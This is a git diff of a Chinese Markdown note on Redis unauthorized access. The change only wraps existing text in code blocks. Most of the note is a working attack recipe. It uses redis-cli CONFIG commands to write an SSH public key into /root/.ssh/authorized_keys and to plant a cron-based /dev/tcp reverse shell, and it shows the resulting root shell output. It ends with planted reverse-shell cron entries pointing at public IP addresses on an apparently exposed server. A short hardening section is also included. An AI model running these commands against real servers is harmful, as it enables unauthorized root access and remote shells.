@@ -5,18 +5,20 @@
 - Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。
 
 ## 2 入侵测试
-> cd /home/dh/.ssh
-> 登陆测试　ssh root@192.168.1.30
-> (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > dh.txt
-> cat dh.txt | redis-cli -h 192.168.1.30 -x set crackit
-> redis-cli -h 192.168.1.30 CONFIG set dir /root/.ssh
-> redis-cli -h 192.168.1.30 config set dbfilename "authorized_keys"
-> redis-cli -h 192.168.1.30 save
-再登陆测试　ssh root@192.168.1.30
-
+```
+ cd /home/dh/.ssh
+ 登陆测试　ssh root@192.168.1.30
+ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > dh.txt
+ cat dh.txt | redis-cli -h 192.168.1.30 -x set crackit
+ redis-cli -h 192.168.1.30 CONFIG set dir /root/.ssh
+ redis-cli -h 192.168.1.30 config set dbfilename "authorized_keys"
+ redis-cli -h 192.168.1.30 save
+ 再登陆测试　ssh root@192.168.1.30
+```
 ### 　利用redis 反弹shell
 
-- １　redis 非root 启动无权限　
+```
+１　redis 非root 启动无权限　
 这时候最多搞点数据破坏　flushall 
 对其他操作基本上没有权限
 dh@dh-pc ~ $ redis-cli -h 192.168.1.30 config set dir /var/spool/cron
@@ -41,9 +43,12 @@ Connection from [211.144.0.242] port 22222 [tcp/*] accepted (family 2, sport 330
 [root@vv30-cimhealth ~]# ls
 30iptables
 anaconda-ks.cfg
+```
 
 ## 3 防御策略
->安全加固
+
+```
+安全加固
 1 防火墙　iptables -I INPUT -p TCP  --destination-port 6379 -s 192.168.0.0/16 -j ACCEPT
 2 不暴露公网　　bind 10.1.1.2
 3 配置文件修改，在redis.conf 中加入如下，防止redis-cli 中乱操作 
@@ -97,5 +102,5 @@ dh@dh-pc ~/.ssh $ redis-cli -h 159.224.49.116
 "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/115.89.238.178/31222 0>&1\n\n"
 159.224.49.116:6379> get xgmhhvskps
 "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/115.89.238.178/31230 0>&1\n\n"
-
+```
 
